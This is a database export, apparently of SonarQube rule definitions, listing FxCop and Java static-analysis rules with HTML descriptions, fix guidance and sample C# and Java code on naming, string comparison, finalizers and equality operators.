215	CA1309: Use ordinal StringComparison	UseOrdinalStringComparison	CA1309	fxcop	<h2>Cause</h2>\n<p>\n            A string comparison operation that is nonlinguistic does not set the <code>StringComparison</code> parameter to either Ordinal or OrdinalIgnoreCase.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Many string operations, most important the String.Compare and String.Equals methods, now provide an overload that accepts a StringComparision enumeration value as a parameter.\n            When you specify either StringComparison.Ordinal or StringComparison.OrdinalIgnoreCase, the string comparison will be nonlinguistic. That is, the features that are specific to the natural language are ignored when comparison decisions are made. This means the decisions are based on simple byte comparisons and ignore casing or equivalence tables that are parameterized by culture. As a result, by explicitly setting the parameter to either the StringComparison.Ordinal or StringComparison.OrdinalIgnoreCase, your code often gains speed, increases correctness, and becomes more reliable.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the string comparison method to an overload that accepts the <code>System.StringComparison</code> enumeration as a parameter, and specify either Ordinal or OrdinalIgnoreCase. For example, change String.Compare(str1, str2) to String.Compare(str1, str2, StringComparison.Ordinal).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the library or application is intended for a limited local audience or when the semantics of the current culture should be used.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb385972.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385972.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806600	1511453806601	1
216	CA1030: Use events where appropriate	UseEventsWhereAppropriate	CA1030	fxcop	<h2>Cause</h2>\n<p>\n            A public, protected, or private method name begins with one of the following:\n            <ul>\n              <li>\n                AddOn\n              </li>\n              <li>\n                RemoveOn\n              </li>\n              <li>\n                Fire\n              </li>\n              <li>\n                Raise\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule detects methods that have names that ordinarily would be used for events. Events follow the Observer or Publish-Subscribe design pattern; they are used when a state change in one object must be communicated to other objects. If a method gets called in response to a clearly defined state change, the method should be invoked by an event handler. Objects that call the method should raise events instead of calling the method directly.\n            Some common examples of events are found in user interface applications where a user action such as clicking a button causes a segment of code to execute. The .NET Framework event model is not limited to user interfaces; it should be used anywhere you must communicate state changes to one or more objects.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            If the method is called when the state of an object changes, you should consider changing the design to use the .NET Framework event model.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if the method does not work with the .NET Framework event model.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182177.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182177.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1d	\N	\N	\N	\N	\N	f	HTML	1511453806601	1511453806602	1
217	CA1306: Set locale for data types	SetLocaleForDataTypes	CA1306	fxcop	<h2>Cause</h2>\n<p>\n            A method or constructor created one or more <code>System.Data.DataTable</code> or <code>System.Data.DataSet</code> instances and did not explicitly set the locale property (<code>DataTable.Locale</code> or <code>DataSet.Locale</code>).\n</p>\n<h2>Rule Description</h2>\n<p>\n            The locale determines culture-specific presentation elements for data, such as formatting used for numeric values, currency symbols, and sort order. When you create a <code>DataTable</code> or <code>DataSet</code>, you should set the locale explicitly. By default, the locale for these types is the current culture. For data that is stored in a database or file and is shared globally, the locale should ordinarily be set to the invariant culture (<code>CultureInfo.InvariantCulture</code>). When data is shared across cultures, using the default locale can cause the contents of the <code>DataTable</code> or <code>DataSet</code> to be presented or interpreted incorrectly.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, explicitly set the locale for the <code>DataTable</code> or <code>DataSet</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the library or application is for a limited local audience, the data is not shared, or the default setting yields the desired behavior in all supported scenarios.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182188.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182188.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806603	1511453806604	1
218	CA1710: Identifiers should have correct suffix	IdentifiersShouldHaveCorrectSuffix	CA1710	fxcop	<h2>Cause</h2>\n<p>\n            An identifier does not have the correct suffix.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By convention, the names of types that extend certain base types or that implement certain interfaces, or types derived from these types, have a suffix that is associated with the base type or interface.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n            The following table lists the base types and interfaces that have associated suffixes.\n\n\n\n\n\n\n\n                    Base type/Interface\n\n\n                    Suffix\n\n\n\n\n\n\n                        <code>System.Attribute</code>\n\n\n\n\n                    Attribute\n\n\n\n\n\n\n                        <code>System.EventArgs</code>\n\n\n\n\n                    EventArgs\n\n\n\n\n\n\n                        <code>System.Exception</code>\n\n\n\n\n                    Exception\n\n\n\n\n\n\n                        <code>System.Collections.ICollection</code>\n\n\n\n\n                    Collection\n\n\n\n\n\n\n                        <code>System.Collections.IDictionary</code>\n\n\n\n\n                    Dictionary\n\n\n\n\n\n\n                        <code>System.Collections.IEnumerable</code>\n\n\n\n\n                    Collection\n\n\n\n\n\n\n                        <code>System.Collections.Queue</code>\n\n\n\n\n                    Collection or Queue\n\n\n\n\n\n\n                        <code>System.Collections.Stack</code>\n\n\n\n\n                    Collection or Stack\n\n\n\n\n\n\n                        <code>System.Collections.Generic.ICollection&lt;T&gt;</code>\n\n\n\n\n                    Collection\n\n\n\n\n\n\n                        System.Collections.Generic.IDictionary&lt;TKey, TValue&gt;\n\n\n\n\n                    Dictionary\n\n\n\n\n\n\n                        <code>System.Data.DataSet</code>\n\n\n\n\n                    DataSet\n\n\n\n\n\n\n                        <code>System.Data.DataTable</code>\n\n\n\n\n                    Collection or DataTable\n\n\n\n\n\n\n                        <code>System.IO.Stream</code>\n\n\n\n\n                    Stream\n\n\n\n\n\n\n                        <code>System.Security.IPermission</code>\n\n\n\n\n                    Permission\n\n\n\n\n\n\n                        <code>System.Security.Policy.IMembershipCondition</code>\n\n\n\n\n                    Condition\n\n\n\n\n                    An event-handler delegate.\n\n\n                    EventHandler\n\n\n\n\n            Types that implement <code>ICollection</code> and are a generalized type of data structure, such as a dictionary, stack, or queue, are allowed names that provide meaningful information about the intended usage of the type.\n            Types that implement <code>ICollection</code> and are a collection of specific items have names that end with the word 'Collection'. For example, a collection of <code>Queue</code> objects would have the name 'QueueCollection'. The 'Collection' suffix signifies that the members of the collection can be enumerated by using the <code>foreach</code> (<code>For Each</code> in Visual Basic) statement.\n            Types that implement <code>IDictionary</code> have names that end with the word 'Dictionary' even if the type also implements <code>IEnumerable</code> or <code>ICollection</code>. The 'Collection' and 'Dictionary' suffix naming conventions enable users to distinguish between the following two enumeration patterns.\n            Types with the 'Collection' suffix follow this enumeration pattern.\n\n\n\n\n\n\n\n\n\n            <pre>\n    foreach(SomeType x in SomeCollection) { }\n</pre>\n\n\n\n\nTypes with the 'Dictionary' suffix follow this enumeration pattern.\n\n\n\n\n\n\n\n\n\n            <pre>\n    foreach(SomeType x in SomeDictionary.Values) { }\n</pre>\n\n\n\n\nA <code>DataSet</code> object consists of a collection of <code>DataTable</code> objects, which consist of collections of <code>System.Data.DataColumn</code> and <code>System.Data.DataRow</code> objects, among others. These collections implement <code>ICollection</code> through the base <code>System.Data.InternalDataCollectionBase</code> class.\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning to use the 'Collection' suffix if the type is a generalized data structure that might be extended or that will hold an arbitrary set of diverse items. In this case, a name that provides meaningful information about the implementation, performance, or other characteristics of the data structure might make sense (for example, BinaryTree). In cases where the type represents a collection of a specific type (for example, StringCollection), do not suppress a warning from this rule because the suffix indicates that the type can be enumerated by using a <code>foreach</code> statement.\n            For other suffixes, do not suppress a warning from this rule. The suffix allows the intended usage to be evident from the type name.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldNotHaveIncorrectSuffix}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182244.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182244.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806604	1511453806605	1
415	Strings should be compared using "equals()"	StringEqualityComparisonCheck	StringEqualityComparisonCheck	squid	<p>Strings, just like any other <code>Object</code>, should be compared using the <code>equals()</code> method.</p>\n<p>Using <code>==</code> and <code>!=</code> compares references rather than values, and usually does not work.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif (variable == "foo") { /* ... */ }\nif (variable != "foo") { /* ... */ }\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nif ("foo".equals(variable)) { /* ... */ }    // Compliant\nif (!"foo".equals(variable)) { /* ... */ }   // Compliant\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison</li>\n</ul>\n\n<p>This rule is deprecated, use {rule:squid:S1698} instead.</p>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453806913	1511453806914	1
416	Modifiers should be declared in the correct order	ModifiersOrderCheck	ModifiersOrderCheck	squid	<p>The Java Language Specification recommends listing modifiers in the following order:</p>\n<p>1. Annotations</p>\n<p>2. public</p>\n<p>3. protected</p>\n<p>4. private</p>\n<p>5. abstract</p>\n<p>6. static</p>\n<p>7. final</p>\n<p>8. transient</p>\n<p>9. volatile</p>\n<p>10. synchronized</p>\n<p>11. native</p>\n<p>12. strictfp</p>\n<p>Not following this convention has no technical impact, but will reduce the code's readability because most developers are used to the standard order.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nstatic public void main(String[] args) {   // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic static void main(String[] args) {   // Compliant\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806914	1511453806914	1
420	Octal values should not be used	S1314	S1314	squid	<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nint myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nint myNumber = 8;\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> MISRA C:2004, 7.1 - Octal constants (other than zero) and octal escape sequences shall not be used.\n</li><li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than "\\0") shall not be used\n</li><li> MISRA C:2012, 7.1 - Octal constants shall not be used\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT DCL18-C</a> - Do not begin integer constants with 0 when specifying a decimal value\n</li></ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,misra,pitfall	f	HTML	1511453806921	1511453806921	1
220	CA1726: Use preferred terms	UsePreferredTerms	CA1726	fxcop	<h2>Cause</h2>\n<p>\n            The name of an externally visible identifier includes a term for which an alternative, preferred term exists. Alternatively, the name includes the term Flag or Flags.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule parses an identifier into tokens. Each single token and each contiguous dual token combination is compared to terms that are built into the rule and in the Deprecated section of any custom dictionaries. The following table shows the terms that are built into the rule and their preferred alternatives.\n\n\n\n\n\n\n\n                    Obsolete term\n\n\n                    Preferred term\n\n\n\n\n                    Arent\n\n\n                    AreNot\n\n\n\n\n                    Cancelled\n\n\n                    Canceled\n\n\n\n\n                    Cant\n\n\n                    Cannot\n\n\n\n\n                    ComPlus\n\n\n                    EnterpriseServices\n\n\n\n\n                    Couldnt\n\n\n                    CouldNot\n\n\n\n\n                    Didnt\n\n\n                    DidNot\n\n\n\n\n                    Doesnt\n\n\n                    DoesNot\n\n\n\n\n                    Dont\n\n\n                    DoNot\n\n\n\n\n                    Flag or Flags\n\n\n                    There is no replacement term. Do not use.\n\n\n\n\n                    Hadnt\n\n\n                    HadNot\n\n\n\n\n                    Hasn’t\n\n\n                    HasNot\n\n\n\n\n                    Havent\n\n\n                    HaveNot\n\n\n\n\n                    Indices\n\n\n                    Indexes\n\n\n\n\n                    Isnt\n\n\n                    IsNot\n\n\n\n\n                    LogIn\n\n\n                    LogOn\n\n\n\n\n                    LogOut\n\n\n                    LogOff\n\n\n\n\n                    Shouldnt\n\n\n                    ShouldNot\n\n\n\n\n                    SignOn\n\n\n                    SignIn\n\n\n\n\n                    SignOff\n\n\n                    SignOut\n\n\n\n\n                    Wasnt\n\n\n                    WasNot\n\n\n\n\n                    Werent\n\n\n                    WereNot\n\n\n\n\n                    Wont\n\n\n                    WillNot\n\n\n\n\n                    Wouldnt\n\n\n                    WouldNot\n\n\n\n\n                    Writeable\n\n\n                    Writable\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the term with the preferred alternative term.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only if the name of the identifier is intentional and relates specifically to the original term instead of the preferred term.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                Naming Warnings\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182258.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182258.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806611	1511453806612	1
221	CA1308: Normalize strings to uppercase	NormalizeStringsToUppercase	CA1308	fxcop	<h2>Cause</h2>\n<p>\n            An operation normalizes a string to lowercase.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Strings should be normalized to uppercase. A small group of characters, when they are converted to lowercase, cannot make a round trip. To make a round trip means to convert the characters from one locale to another locale that represents character data differently, and then to accurately retrieve the original characters from the converted characters.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change operations that convert strings to lowercase so that the strings are converted to uppercase instead. For example, change String.ToLower(CultureInfo.InvariantCulture) to String.ToUpper(CultureInfo.InvariantCulture).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning message when you are not making security decision based on the result (for example, when you are displaying it in the UI).\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb386042.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386042.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806613	1511453806613	1
222	CA2221: Finalizers should be protected	FinalizersShouldBeProtected	CA2221	fxcop	<h2>Cause</h2>\n<p>\n            A public type implements a finalizer that does not specify family (protected) access.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Finalizers must use the family access modifier. This rule is enforced by the C#, Visual Basic, and Visual C++ compilers.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the finalizer to be family-accessible.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182340.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182340.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806614	1511453806614	1
223	CA1046: Do not overload operator equals on reference types	DoNotOverloadOperatorEqualsOnReferenceTypes	CA1046	fxcop	<h2>Cause</h2>\n<p>\n            A public or nested public reference type overloads the equality operator.\n</p>\n<h2>Rule Description</h2>\n<p>\n            For reference types, the default implementation of the equality operator is almost always correct. By default, two references are equal only if they point to the same object.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the implementation of the equality operator.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the reference type behaves like a built-in value type. If it is meaningful to do addition or subtraction on instances of the type, it is probably correct to implement the equality operator and suppress the violation.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverloadingAddAndSubtract}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182145.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182145.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806615	1511453806615	1
224	CA2219: Do not raise exceptions in exception clauses	DoNotRaiseExceptionsInExceptionClauses	CA2219	fxcop	<h2>Cause</h2>\n<p>\n            An exception is thrown from a <code>finally</code>, filter, or fault clause.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When an exception is raised in an exception clause, it greatly increases the difficulty of debugging.\n            When an exception is raised in a <code>finally</code> or fault clause, the new exception hides the active exception, if present. This makes the original error hard to detect and debug.\n            When an exception is raised in a filter clause, the runtime silently catches the exception, and causes the filter to evaluate to false. There is no way to tell the difference between the filter evaluating to false and an exception being throw from a filter. This makes it hard to detect and debug errors in the filter's logic.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix this violation of this rule, do not explicitly raise an exception from a <code>finally</code>, filter, or fault clause.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning for this rule. There are no scenarios under which an exception raised in an exception clause provides a benefit to the executing code.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA1065: Do not raise exceptions in unexpected locations\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb386041.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386041.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806617	1511453806617	1
225	CA2224: Override equals on overloading operator equals	OverrideEqualsOnOverloadingOperatorEquals	CA2224	fxcop	<h2>Cause</h2>\n<p>\n            A public type implements the equality operator, but does not override <code>Object.Equals</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The equality operator is intended to be a syntactically convenient way to access the functionality of the <code>Equals</code> method. If you implement the equality operator, its logic must be identical to that of <code>Equals</code>.\n            The C# compiler issues a warning if your code violates this rule.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, you should either remove the implementation of the equality operator, or override <code>Equals</code> and have the two methods return the same values. If the equality operator does not introduce inconsistent behavior, you can fix the violation by providing an implementation of <code>Equals</code> that calls the <code>Equals</code> method in the base class.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the equality operator returns the same value as the inherited implementation of <code>Equals</code>. The Example section includes a type that could safely suppress a warning from this rule.\n</p>\n<h2>Examples of Inconsistent Equality Definitions</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a type with inconsistent definitions of equality. BadPoint changes the meaning of equality by providing a custom implementation of the equality operator, but does not override <code>Equals</code> so that it behaves identically.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace UsageLibrary\n{\n    public class BadPoint\n    {\n        private int x,y, id;\n        private static int NextId;\n\n        static BadPoint()\n        {\n            NextId = -1;\n        }\n        public BadPoint(int x, int y)\n        {\n            this.x = x;\n            this.y = y;\n            id = ++(BadPoint.NextId);\n        }\n\n        public override string ToString()\n        {\n            return String.Format("([{0}] {1},{2})",id,x,y);\n        }\n\n        public int X {get {return x;}}\n\n        public int Y {get {return x;}}\n        public int Id {get {return id;}}\n\n        public override int GetHashCode()\n        {\n            return id;\n        }\n        // Violates rule: OverrideEqualsOnOverridingOperatorEquals. \n\n        // BadPoint redefines the equality operator to ignore the id value. \n        // This is different from how the inherited implementation of  \n        // System.Object.Equals behaves for value types.  \n        // It is not safe to exclude the violation for this type.  \n        public static bool operator== (BadPoint p1, BadPoint p2)\n        {\n            return ((p1.x == p2.x) &amp;&amp; (p1.y == p2.y));\n        }\n        // The C# compiler and rule OperatorsShouldHaveSymmetricalOverloads require this. \n        public static bool operator!= (BadPoint p1, BadPoint p2)\n        {\n            return !(p1 == p2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a class (reference type) that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    // Violates this rule     \n    public class Point\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            if (point1 == null || point2 == null)\n                return false;\n\n            if (point1.GetType() != point2.GetType())\n                return false;\n\n            if (point1._X != point2._X)\n                return false;\n\n            return point1._Y == point2._Y;\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !(point1 == point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Structure Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a structure (value type) that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    // Violates this rule     \n    public struct Point\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            if (point1._X != point2._X)\n                return false;\n\n            return point1._Y == point2._Y;\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !(point1 == point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>\n\n\n\n\n                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>\n\n\n\n\n                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>\n\n\n\n\n                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182357.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182357.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806618	1511453806618	1
241	CA1506: Avoid excessive class coupling	AvoidExcessiveClassCoupling	CA1506	fxcop	<h2>Cause</h2>\n<p>\n            A type or method is coupled with many other types.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule measures class coupling by counting the number of unique type references that a type or method contains.\n            Types and methods that have a high degree of class coupling can be difficult to maintain. It is a good practice to have types and methods that exhibit low coupling and high cohesion.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix this violation, try to redesign the type or method to reduce the number of types to which it is coupled.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Exclude this warning when the type or method is still considered maintainable despite its large number of dependencies on other types.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb397994.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb397994.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806639	1511453806639	1
226	CA1019: Define accessors for attribute arguments	DefineAccessorsForAttributeArguments	CA1019	fxcop	<h2>Cause</h2>\n<p>\n            In its constructor, an attribute defines arguments that do not have corresponding properties.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Attributes can define mandatory arguments that must be specified when you apply the attribute to a target. These are also known as positional arguments because they are supplied to attribute constructors as positional parameters. For every mandatory argument, the attribute should also provide a corresponding read-only property so that the value of the argument can be retrieved at execution time. This rule checks that for each constructor parameter, you have defined the corresponding property.\n            Attributes can also define optional arguments, which are also known as named arguments. These arguments are supplied to attribute constructors by name and should have a corresponding read/write property.\n            For mandatory and optional arguments, the corresponding properties and constructor parameters should use the same name but different casing. Properties use Pascal casing, and parameters use camel casing.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a read-only property for each constructor parameter that does not have one.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if you do not want the value of the mandatory argument to be retrievable.\n</p>\n<h2>Custom Attributes Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows two attributes that define a mandatory (positional) parameter. The first implementation of the attribute is incorrectly defined. The second implementation is correct.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace DesignLibrary\n{\n// Violates rule: DefineAccessorsForAttributeArguments.\n\n   [AttributeUsage(AttributeTargets.All)]\n   public sealed class BadCustomAttribute :Attribute\n   {\n      string data;\n\n      // Missing the property that corresponds to  \n      // the someStringData parameter. \n\n      public BadCustomAttribute(string someStringData)\n      {\n         data = someStringData;\n      }\n   }\n\n// Satisfies rule: Attributes should have accessors for all arguments.\n\n   [AttributeUsage(AttributeTargets.All)]\n   public sealed class GoodCustomAttribute :Attribute\n   {\n      string data;\n\n      public GoodCustomAttribute(string someStringData)\n      {\n         data = someStringData;\n      }\n      //The constructor parameter and property \n      //name are the same except for case. \n\n      public string SomeStringData\n      {\n         get\n         {\n            return data;\n         }\n      }\n   }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Positional and Named Arguments</h2>\n\n<h3>Description</h3>\n<p>\n                Positional and named arguments make to clear to consumers of your library which arguments are mandatory for the attribute and which arguments are optional.\n                The following example shows an implementation of an attribute that has both positional and named arguments.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace DesignLibrary\n{\n    [AttributeUsage(AttributeTargets.All)]\n    public sealed class GoodCustomAttribute : Attribute\n    {\n        string mandatory;\n        string optional;\n\n        public GoodCustomAttribute(string mandatoryData)\n        {\n            mandatory = mandatoryData;\n        }\n\n        public string MandatoryData\n        {\n            get { return mandatory; }\n        }\n\n        public string OptionalData\n        {\n            get { return optional; }\n            set { optional = value; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                The following example shows how to apply the custom attribute to two properties.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\n[GoodCustomAttribute("ThisIsSomeMandatoryData", OptionalData = "ThisIsSomeOptionalData")]\npublic string MyProperty\n{\n    get { return myProperty; }\n    set { myProperty = value; }\n}\n\n[GoodCustomAttribute("ThisIsSomeMoreMandatoryData")]\npublic string MyOtherProperty\n{\n    get { return myOtherProperty; }\n    set { myOtherProperty = value; }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUnsealedAttributes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182136.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182136.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806619	1511453806620	1
227	CA2220: Finalizers should call base class finalizer	FinalizersShouldCallBaseClassFinalizer	CA2220	fxcop	<h2>Cause</h2>\n<p>\n            A type that overrides <code>Object.Finalize</code> does not call the <code>Finalize</code> method in its base class.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Finalization must be propagated through the inheritance hierarchy. To ensure this, types must call their base class <code>Finalize</code> method from within their own <code>Finalize</code> method. The C# compiler adds the call to the base class finalizer automatically.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call the base type's <code>Finalize</code> method from your <code>Finalize</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Some compilers that target the common language runtime insert a call to the base type's finalizer into the Microsoft intermediate language (MSIL). If a warning from this rule is reported, your compiler does not insert the call, and you must add it to your code.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182341.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182341.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	